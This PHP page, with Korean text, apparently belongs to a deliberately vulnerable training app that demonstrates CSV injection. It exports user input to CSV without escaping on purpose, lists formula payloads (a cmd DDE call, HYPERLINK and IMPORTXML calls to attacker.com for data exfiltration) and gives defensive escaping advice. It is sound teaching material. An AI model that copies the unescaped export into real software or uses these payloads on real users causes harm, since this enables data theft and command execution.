<?php
/**
 * CSV Injection 취약점 테스트 페이지
 */
session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$message = '';
$csv_output = '';
$user_input = $_POST['user_input'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (empty($user_input)) {
        $message = "입력값을 넣어주세요.";
    } else {
        // --- 취약점 발생 지점 ---
        // CSV로 내보낼 때 사용자 입력에 대한 적절한 필터링 없음
        // (예: =,+,-,@ 등의 문자를 이스케이프 처리해야 함)

        $data = [
            ['ID', 'Name', 'Value'],
            [1, 'Test User', $user_input],
            [2, 'Another User', 'Safe Value']
        ];

        $csv_output = '';
        foreach ($data as $row) {
            $csv_output .= implode(',', $row) . "\n";
        }

        $message = "CSV 데이터가 생성되었습니다. 아래 내용을 복사하여 스프레드시트 프로그램에 붙여넣어 보세요.";
    }
}

?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSV Injection 테스트 - 보안 테스트</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div class="container">
        <nav class="nav">
            <h1>CSV Injection 테스트</h1>
            <div class="nav-links">
                <a href="index.php" class="btn">보안 테스트 메인</a>
                <a href="../index.php" class="btn">홈</a>
            </div>
        </nav>

        <div class="info-box">
            <h3>🚨 CSV Injection 취약점</h3>
            <p>사용자 입력이 CSV 파일로 내보내질 때, 특정 문자로 시작하는 입력값(예: <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>)이 스프레드시트 프로그램에서 수식으로 해석되어 악성 코드가 실행될 수 있는 취약점입니다.</p>
            <p>이를 통해 정보 유출, 임의 코드 실행 등의 공격이 가능합니다.</p>
        </div>

        <div class="test-form">
            <h3>🧪 CSV 데이터 생성 테스트</h3>
            <p>아래 입력 필드에 페이로드를 입력하고 CSV 데이터를 생성해 보세요. 생성된 데이터를 스프레드시트 프로그램에 붙여넣어 결과를 확인합니다.</p>
            <form method="post">
                <label for="user_input">입력값:</label>
                <textarea name="user_input" id="user_input" placeholder="여기에 페이로드를 입력하세요"><?php echo htmlspecialchars($user_input); ?></textarea>
                <button type="submit" class="btn">CSV 데이터 생성</button>
            </form>
        </div>

        <?php if ($message): ?>
            <div class="result-box">
                <h3>📊 생성된 CSV 데이터</h3>
                <p><?php echo htmlspecialchars($message); ?></p>
                <?php if ($csv_output): ?>
                    <pre><code><?php echo htmlspecialchars($csv_output); ?></code></pre>
                    <button class="btn" onclick="copyToClipboard()">CSV 데이터 복사</button>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <div class="payload-section">
            <h3>🎯 공격 시나리오</h3>
            <ol>
                <li>아래 페이로드를 입력 필드에 붙여넣고 'CSV 데이터 생성' 버튼을 클릭합니다.</li>
                <li>생성된 CSV 데이터를 복사하여 Excel, Google Sheets 등 스프레드시트 프로그램에 붙여넣습니다.</li>
                <li>수식이 실행되거나 경고 메시지가 나타나는지 확인합니다.</li>
            </ol>
            <h4>주요 페이로드:</h4>
            <ul>
                <li><code>=cmd|' /C calc'!A0</code> (Windows 계산기 실행)</li>
                <li><code>=HYPERLINK("http://attacker.com?data="&A1,"Click me")</code> (정보 유출)</li>
                <li><code>=1+1</code> (간단한 수식 실행)</li>
                <li><code>=IMPORTXML("http://attacker.com/evil.xml","//data")</code> (외부 데이터 가져오기)</li>
            </ul>
        </div>

        <div class="info-box">
            <h3>🛡️ CSV Injection 방어 방법</h3>
            <ul>
                <li>CSV로 내보낼 모든 사용자 입력 필드의 시작 문자가 <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code> 인 경우, 해당 문자를 이스케이프 처리하거나 제거합니다. (예: 앞에 <code>'</code>를 추가)</li>
                <li>사용자 입력에 대한 엄격한 화이트리스트 기반 유효성 검증을 수행합니다.</li>
                <li>스프레드시트 프로그램에서 매크로 실행 경고를 활성화하도록 사용자에게 안내합니다.</li>
            </ul>
        </div>
    </div>

    <script>
        function copyToClipboard() {
            const csvData = document.querySelector('.result-box pre code').textContent;
            navigator.clipboard.writeText(csvData).then(() => {
                alert('CSV 데이터가 클립보드에 복사되었습니다.');
            }).catch(err => {
                console.error('클립보드 복사 실패:', err);
                alert('클립보드 복사 실패!');
            });
        }
    </script>
</body>
</html>
